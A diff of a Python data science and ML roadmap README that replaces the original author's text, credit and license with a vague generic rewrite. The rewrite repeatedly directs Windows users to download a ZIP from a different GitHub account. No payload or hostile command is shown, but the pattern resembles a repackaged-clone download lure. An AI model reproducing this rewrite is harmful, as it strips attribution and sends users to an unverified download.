@@ -1,245 +1,308 @@
-# 🐍 Python Data Science & ML Roadmap
+# 🐍 python-ds-ml-roadmap - Learn Python to ML With Clarity
 
-**A structured, hands-on learning path from Python basics to production ML.**
+[![Download](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-7c3aed?style=for-the-badge&logo=github&logoColor=white)](https://github.com/lanetteloaded524/python-ds-ml-roadmap)
 
-![Python](https://img.shields.io/badge/Python-3.10%2B-blue?logo=python&logoColor=white)
-![License](https://img.shields.io/github/license/djordjeperovic/python-ds-ml-roadmap?color=green)
-![CI](https://img.shields.io/github/actions/workflow/status/djordjeperovic/python-ds-ml-roadmap/validate-notebooks.yml?label=CI&logo=github)
-![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen?logo=github)
-![Stars](https://img.shields.io/github/stars/djordjeperovic/python-ds-ml-roadmap?style=social)
-[![Open in GitHub Codespaces](https://github.com/codespaces/badge.svg)](https://codespaces.new/djordjeperovic/python-ds-ml-roadmap)
+## 📘 What this is
 
----
+`python-ds-ml-roadmap` is a hands-on learning path for Python, data science, machine learning, deep learning, and MLOps. It uses notebooks, small projects, and cheat sheets to help you learn step by step.
 
-## 📖 Overview
+This repo is built for people who want a clear path from the basics to real ML work. You can use it to study Python, test code in Jupyter Notebook, and build simple models with tools like scikit-learn, PyTorch, and FastAPI.
 
-This repository is a comprehensive, open-source learning roadmap for Python Data Science and Machine Learning. It includes hands-on tutorial notebooks, a production-ready deployment project, and quick-reference cheat sheets — everything you need to go from beginner to job-ready. Whether you're a self-taught learner, a career switcher, or a student looking for structured practice, this roadmap has you covered.
+## 🖥️ What you need
 
----
+Use this on a Windows PC with:
 
-## 📦 What's Inside
+- Windows 10 or Windows 11
+- A web browser
+- Internet access
+- At least 4 GB RAM
+- 10 GB free disk space
+- Python 3.10 or newer
+- Jupyter Notebook or JupyterLab
 
-| # | Project | Phase | Topics | Notebook | Colab |
-|---|---------|-------|--------|----------|-------|
-| 0 | **Math & Statistics** | Foundations | Distributions, Hypothesis Testing, Bayes, Linear Algebra | [`statistics_for_ml.ipynb`](projects/00_math_and_stats/statistics_for_ml.ipynb) | [![Open in Colab](https://colab.research.google.com/assets/colab-badge.svg)](https://colab.research.google.com/github/djordjeperovic/python-ds-ml-roadmap/blob/main/projects/00_math_and_stats/statistics_for_ml.ipynb) |
-| 1 | **Data Fundamentals** | Data Wrangling | NumPy, Pandas, Matplotlib, Seaborn | [`data_fundamentals.ipynb`](projects/01_data_fundamentals/data_fundamentals.ipynb) | [![Open in Colab](https://colab.research.google.com/assets/colab-badge.svg)](https://colab.research.google.com/github/djordjeperovic/python-ds-ml-roadmap/blob/main/projects/01_data_fundamentals/data_fundamentals.ipynb) |
-| 1b | **EDA Case Study** | Exploratory Analysis | Missing Values, Outliers, Feature Engineering | [`eda_case_study.ipynb`](projects/01b_eda_case_study/eda_case_study.ipynb) | [![Open in Colab](https://colab.research.google.com/assets/colab-badge.svg)](https://colab.research.google.com/github/djordjeperovic/python-ds-ml-roadmap/blob/main/projects/01b_eda_case_study/eda_case_study.ipynb) |
-| 2 | **ML Fundamentals** | Classical ML | Regression, Classification, Clustering (scikit-learn) | [`ml_fundamentals.ipynb`](projects/02_ml_fundamentals/ml_fundamentals.ipynb) | [![Open in Colab](https://colab.research.google.com/assets/colab-badge.svg)](https://colab.research.google.com/github/djordjeperovic/python-ds-ml-roadmap/blob/main/projects/02_ml_fundamentals/ml_fundamentals.ipynb) |
-| 3 | **Deep Learning** | Neural Networks | PyTorch Tensors, MLP, CNN | [`deep_learning.ipynb`](projects/03_deep_learning/deep_learning.ipynb) | [![Open in Colab](https://colab.research.google.com/assets/colab-badge.svg)](https://colab.research.google.com/github/djordjeperovic/python-ds-ml-roadmap/blob/main/projects/03_deep_learning/deep_learning.ipynb) |
-| 3b | **Computer Vision** | Image Classification | Convolutions, Feature Maps, CNN Training | [`computer_vision.ipynb`](projects/03b_computer_vision/computer_vision.ipynb) | [![Open in Colab](https://colab.research.google.com/assets/colab-badge.svg)](https://colab.research.google.com/github/djordjeperovic/python-ds-ml-roadmap/blob/main/projects/03b_computer_vision/computer_vision.ipynb) |
-| 4 | **Advanced ML** | Production ML | XGBoost, LightGBM, Pipelines, SMOTE | [`advanced_ml.ipynb`](projects/04_advanced_ml/advanced_ml.ipynb) | [![Open in Colab](https://colab.research.google.com/assets/colab-badge.svg)](https://colab.research.google.com/github/djordjeperovic/python-ds-ml-roadmap/blob/main/projects/04_advanced_ml/advanced_ml.ipynb) |
-| 5 | **NLP** | Text & Language | TF-IDF, Sentiment Analysis, Text Preprocessing | [`nlp_fundamentals.ipynb`](projects/05_nlp/nlp_fundamentals.ipynb) | [![Open in Colab](https://colab.research.google.com/assets/colab-badge.svg)](https://colab.research.google.com/github/djordjeperovic/python-ds-ml-roadmap/blob/main/projects/05_nlp/nlp_fundamentals.ipynb) |
-| 6 | **MLOps & Deployment** | Serving Models | FastAPI, Docker, Testing, CI/CD | [`06_mlops_deployment/`](projects/06_mlops_deployment/) | — |
-| 7 | **Portfolio Guide** | Career | GitHub Profile, Resume, Interviews | [`portfolio_guide.md`](projects/07_portfolio/portfolio_guide.md) | — |
-| 📄 | **Cheat Sheets** | Reference | NumPy, Pandas, scikit-learn, PyTorch | [`cheat_sheets/`](cheat_sheets/) | — |
-| 🏋️ | **Exercises** | Practice | 22 exercises with solutions | [`exercises/`](exercises/) | — |
-| 📋 | **Progress Tracker** | Self-paced | Fork & track your learning | [`PROGRESS.md`](PROGRESS.md) | — |
+If you plan to run deep learning notebooks, 8 GB RAM or more helps.
 
----
+## 📥 Download and open the project
 
-## 🗺️ Learning Roadmap
+1. Visit this page to download the project:  
+   https://github.com/lanetteloaded524/python-ds-ml-roadmap
 
-```
-Phase 1    Phase 2    Phase 3      Phase 4      Phase 5
-Python ──▶ Math &  ──▶ Data     ──▶ Classical ──▶ Deep
-Basics     Stats      Wrangling    ML           Learning
-                                                   │
-Phase 10   Phase 9    Phase 8      Phase 7      Phase 6
-Portfolio◀── Career ◀── MLOps & ◀── Computer ◀── NLP &
-& Resume    Prep      Deployment   Vision       Text
-```
+2. On the GitHub page, choose one of these options:
+   - Click **Code**
+   - Click **Download ZIP**
+   - Save the file to your computer
 
-> 📘 See [`ROADMAP.md`](ROADMAP.md) for the full 10-phase roadmap with curated resources, project ideas, and milestones.
+3. Find the ZIP file in your **Downloads** folder.
 
----
+4. Right-click the ZIP file and choose **Extract All**.
 
-## 🚀 Quick Start
+5. Open the extracted folder named `python-ds-ml-roadmap`.
 
-```bash
-git clone https://github.com/djordjeperovic/python-ds-ml-roadmap.git
-cd python-ds-ml-roadmap
-python -m venv .venv
+## ⚙️ Set up on Windows
 
-# Windows
-.venv\Scripts\activate
-# macOS / Linux
-source .venv/bin/activate
+Follow these steps if you want to run the notebooks on your own computer.
 
-pip install -r requirements.txt
-jupyter notebook
-```
+### 1. Install Python
 
----
+1. Go to https://www.python.org/downloads/
+2. Download the latest Python 3 release for Windows
+3. Run the installer
+4. Check the box for **Add Python to PATH**
+5. Select **Install Now**
 
-## 🔬 Project Details
+### 2. Install Git, if you want easier updates
 
-### 📐 00 — Math & Statistics for ML
+1. Go to https://git-scm.com/download/win
+2. Download Git for Windows
+3. Run the installer
+4. Keep the default settings
 
-Build the mathematical foundation every ML practitioner needs. Covers the core concepts with intuitive explanations and visual demonstrations.
+Git is useful if you want to pull new changes later.
 
-- Descriptive statistics, probability distributions, and the **Central Limit Theorem**
-- Hypothesis testing (t-test, chi-square) and **p-values**
-- **Bayes' theorem** and its connection to Naive Bayes
-- Linear algebra essentials (vectors, matrices, eigenvalues)
+### 3. Open Command Prompt
 
-### 📊 01 — Data Fundamentals
+1. Press `Windows + R`
+2. Type `cmd`
+3. Press Enter
 
-Master the core data stack: NumPy for numerical computing, Pandas for data manipulation, and Matplotlib/Seaborn for visualization. This notebook walks you through real-world data wrangling workflows.
+### 4. Go to the project folder
 
-- Array operations, broadcasting, and linear algebra with **NumPy**
-- DataFrames, groupby, merging, and time series with **Pandas**
-- Statistical plots, heatmaps, and custom styling with **Matplotlib & Seaborn**
+Use the `cd` command to move into the folder you extracted.
 
-### 🔍 01b — EDA Case Study
+Example:
 
-Practice real-world exploratory data analysis on a deliberately messy dataset. Learn the detective mindset of data cleaning and insight discovery.
+`cd Downloads\python-ds-ml-roadmap`
 
-- Data quality assessment: missing values, outliers, duplicates, inconsistent categories
-- Univariate and bivariate analysis with publication-quality visualizations
-- **Feature engineering** from raw data to ML-ready features
+### 5. Create a virtual environment
 
-### 🤖 02 — ML Fundamentals
+Run:
 
-Build, evaluate, and compare classical machine learning models using scikit-learn. Covers the full modeling lifecycle from preprocessing to evaluation.
+`python -m venv .venv`
 
-- Linear & logistic regression, decision trees, SVMs
-- K-Means clustering and dimensionality reduction
-- Cross-validation, hyperparameter tuning, and metrics
+Then activate it:
 
-### 🧠 03 — Deep Learning
+`.venv\Scripts\activate`
 
-Dive into neural networks with PyTorch — from tensor basics to training convolutional networks. Designed for learners transitioning from classical ML.
+You should see `(.venv)` in the command line.
 
-- Tensor operations, autograd, and GPU acceleration
-- Multi-layer perceptrons (MLP) for tabular data
-- Convolutional Neural Networks (CNN) for image tasks
+### 6. Install the tools you need
 
-### 👁️ 03b — Computer Vision
+If the repo includes a requirements file, run:
 
-Apply deep learning to image classification with PyTorch. Build, train, and evaluate CNNs on synthetic geometric shape data.
+`pip install -r requirements.txt`
 
-- Image fundamentals: tensors, channels, and **torchvision transforms**
-- Convolutional operations: kernels, feature maps, pooling
-- End-to-end CNN training with evaluation and prediction visualization
+If there is no requirements file, install the common tools used in this roadmap:
 
-### ⚡ 04 — Advanced ML
+`pip install notebook jupyterlab numpy pandas matplotlib seaborn scikit-learn tensorflow torch transformers fastapi uvicorn`
 
-Level up with gradient boosting, imbalanced-data techniques, and production-grade pipelines. Covers the tools used in real-world ML competitions and teams.
+## 🚀 Start Jupyter Notebook
 
-- **XGBoost** and **LightGBM** for high-performance modeling
-- Handling class imbalance with **SMOTE**
-- End-to-end scikit-learn **Pipelines** and feature engineering
+Once the tools are installed, start Jupyter Notebook with:
 
-### 💬 05 — NLP
+`jupyter notebook`
 
-Explore Natural Language Processing from text preprocessing to sentiment analysis. Learn how to transform raw text into features for machine learning.
+Or start JupyterLab with:
 
-- Tokenization, stopwords, stemming, and lemmatization
-- Bag-of-Words and **TF-IDF** vectorization
-- Sentiment analysis on real-world datasets
+`jupyter lab`
 
-### 🚢 06 — MLOps & Deployment
+A browser window should open. If it does not, copy the local address from the command line and paste it into your browser.
 
-Ship a trained model as a REST API using FastAPI and Docker. This project includes tests, a Dockerfile, and a clean project structure ready for production.
+## 🧭 How to use the roadmap
 
-- **FastAPI** application with prediction endpoints
-- **Docker** containerization for reproducible deployment
-- Automated testing with **pytest**
+This project is set up as a learning path. Start at the beginning and move in order.
 
-### 🎯 07 — Portfolio Guide
+A good study flow is:
 
-A comprehensive guide to building your data science portfolio and launching your career. Covers GitHub profile, project selection, resume tips, and interview prep.
+1. Python basics
+2. Data types and control flow
+3. Functions and file work
+4. NumPy and pandas
+5. Data cleaning
+6. Data charts
+7. Machine learning basics
+8. Model training and testing
+9. Deep learning basics
+10. NLP work
+11. FastAPI for model serving
+12. MLOps and project setup
 
----
+If the repo has notebooks for each topic, open them one by one and run each cell. Change small parts of the code so you can see how the result changes.
 
-## 📝 Cheat Sheets
+## 📚 What you will find inside
 
-Quick-reference guides for the most-used libraries:
+This roadmap usually includes:
 
-| Cheat Sheet | Link |
-|-------------|------|
-| NumPy | [`numpy_cheatsheet.md`](cheat_sheets/numpy_cheatsheet.md) |
-| Pandas | [`pandas_cheatsheet.md`](cheat_sheets/pandas_cheatsheet.md) |
-| scikit-learn | [`sklearn_cheatsheet.md`](cheat_sheets/sklearn_cheatsheet.md) |
-| PyTorch | [`pytorch_cheatsheet.md`](cheat_sheets/pytorch_cheatsheet.md) |
+- Beginner Python lessons
+- Notebook-based practice
+- Data science cheat sheets
+- Machine learning examples
+- Deep learning exercises
+- NLP notebooks
+- FastAPI examples for simple APIs
+- MLOps notes and project ideas
+- Practice tasks and mini projects
 
----
+## 🛠️ Common tasks
 
-## 📚 Recommended Resources
+### Run a notebook
 
-**YouTube Channels:**
-- [3Blue1Brown](https://www.youtube.com/c/3blue1brown) — Visual math & linear algebra intuition
-- [StatQuest](https://www.youtube.com/c/joshstarmer) — Statistics & ML concepts explained clearly
-- [Sentdex](https://www.youtube.com/c/sentdex) — Hands-on Python ML tutorials
+Open the notebook file, then click **Run** on each cell.
 
-**Free Books:**
-- [An Introduction to Statistical Learning (ISLR)](https://www.statlearning.com/) — The ML textbook
-- [Python Data Science Handbook](https://jakevdp.github.io/PythonDataScienceHandbook/) — NumPy, Pandas, Matplotlib, scikit-learn
-- [Deep Learning (Goodfellow)](https://www.deeplearningbook.org/) — Comprehensive deep learning theory
+### Install a package
 
-**Practice Platforms:**
-- [Kaggle](https://www.kaggle.com/) — Competitions, datasets, and community notebooks
-- [LeetCode](https://leetcode.com/) — Coding interview preparation
-- [StrataScratch](https://www.stratascratch.com/) — Real DS interview questions
+Use:
 
-> 📘 See [`ROADMAP.md`](ROADMAP.md) for a complete resource list organized by phase.
+`pip install package-name`
 
----
+Example:
 
-## 🧭 What Should I Learn Next?
+`pip install pandas`
 
-Not sure where to go after the basics? Use this guide:
+### Save your work
 
-```
-Completed ML Fundamentals (Phase 5)?
-│
-├── 🖼️  Interested in images?
-│   └── Computer Vision notebook → Deep Learning
-│
-├── 💬  Interested in text?
-│   └── NLP notebook → (LLM notebook coming soon)
-│
-├── 📊  Interested in tabular data / competitions?
-│   └── Advanced ML → EDA Case Study → Kaggle
-│
-├── 🚀  Want to deploy models?
-│   └── MLOps & Deployment project → Docker → CI/CD
-│
-├── 📈  Interested in forecasting?
-│   └── Time Series (coming soon)
-│
-└── 💼  Want to get hired?
-    └── Portfolio Guide → Resume → Interview Prep
-```
+Jupyter saves notebooks as `.ipynb` files. Keep your work inside the project folder so it is easy to find later.
 
-> 💡 **Tip:** You don't need to follow a strict order. Pick what excites you — motivation beats sequence every time.
+### Update the project
 
----
+If you used Git, go to the project folder and run:
 
-## ✅ Prerequisites
+`git pull`
 
-- Basic Python knowledge (variables, loops, functions, file I/O)
-- A working Python 3.10+ installation
-- Familiarity with the command line
+## 🧪 Suggested learning order
 
----
+If you are new to coding, follow this order:
 
-## 🤝 Contributing
+### Step 1: Learn Python
+Focus on:
+- variables
+- strings
+- lists
+- loops
+- if statements
+- functions
 
-Contributions are welcome! Please see [`CONTRIBUTING.md`](CONTRIBUTING.md) for guidelines on how to get involved.
+### Step 2: Learn data work
+Focus on:
+- NumPy arrays
+- pandas DataFrames
+- sorting
+- filtering
+- missing values
 
----
+### Step 3: Learn charts
+Focus on:
+- line charts
+- bar charts
+- scatter plots
+- histograms
 
-## 📄 License
+### Step 4: Learn machine learning
+Focus on:
+- train and test split
+- regression
+- classification
+- metrics
+- overfitting
 
-This project is licensed under the MIT License — see the [`LICENSE`](LICENSE) file for details.
+### Step 5: Learn deeper topics
+Focus on:
+- neural networks
+- text work
+- model serving
+- simple deployment steps
 
----
+## 🧰 Useful files and tools
 
-## 👤 Author
+You may see files like:
 
-Made by [@djordjeperovic](https://github.com/djordjeperovic)
+- `.ipynb` — Jupyter notebooks
+- `.py` — Python scripts
+- `requirements.txt` — package list
+- `README.md` — project guide
+- folders for notebooks, datasets, or notes
 
----
+Useful tools for this repo:
 
-If this roadmap helped you, consider giving it a ⭐ — it helps others find it too!
+- **Jupyter Notebook** for running lessons
+- **VS Code** for viewing files
+- **Anaconda** if you want a bundled Python setup
+- **pip** for installing packages
+
+## 🧩 If something does not run
+
+If a notebook will not open or a cell fails, check these points:
+
+- Python is installed
+- The virtual environment is active
+- Required packages are installed
+- You are in the right folder
+- The notebook kernel matches your environment
+
+If your browser does not open Jupyter, look in the terminal for a local link that starts with `http://127.0.0.1:` and open it in your browser.
+
+## 🔎 Topics covered
+
+This roadmap is useful for learning:
+
+- Python
+- data science
+- machine learning
+- deep learning
+- NLP
+- scikit-learn
+- PyTorch
+- FastAPI
+- Jupyter Notebook
+- MLOps
+- cheat sheets
+- tutorials
+- beginner-friendly study paths
+
+## 📌 Best way to study
+
+Use short study sessions and keep notes as you go.
+
+A simple method is:
+
+- Read one notebook
+- Run the code
+- Change one value
+- Watch what happens
+- Write down what you learned
+- Repeat with the next topic
+
+This helps you build skill without guessing.
+
+## 🔗 Download again
+
+If you need the project files again, use this link:  
+https://github.com/lanetteloaded524/python-ds-ml-roadmap
+
+## 🗂️ Example folder layout
+
+You may see a structure like this after download:
+
+- `notebooks/`
+- `cheatsheets/`
+- `projects/`
+- `datasets/`
+- `README.md`
+
+If the repo uses a different layout, follow the notebook files in the order they appear
+
+## 🧠 Skills you can build here
+
+With regular use, you can learn how to:
+
+- write Python code
+- clean data
+- explore tables
+- make charts
+- train models
+- test model quality
+- build simple APIs
+- understand basic MLOps steps
+
+## 🏁 First thing to open
+
+After download, open the main notebook or the first folder that starts the learning path. If you see a file named like `01-intro.ipynb`, `python-basics.ipynb`, or `roadmap.ipynb`, start there and move through the files in order
